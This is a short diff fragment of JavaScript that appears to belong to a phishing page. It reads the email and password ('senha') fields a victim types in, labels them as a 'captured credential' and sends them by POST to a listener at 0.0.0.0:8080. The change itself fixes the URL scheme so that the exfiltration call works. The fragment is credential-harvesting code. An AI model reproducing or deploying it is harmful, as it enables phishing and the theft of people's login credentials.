@@ -24,7 +24,7 @@
       var senha = document.getElementById('senha').value;
       var data = "####\n\n[🥃 CREDENCIAL CAPTURADA]\nEMAIL: " + email + "\nSENHA: " + senha + "\n\n####\n";
 
-      fetch('tcp://0.0.0.0:8080', {
+      fetch('http://0.0.0.0:8080', {
         method: 'POST',
         body: data,
         headers: {
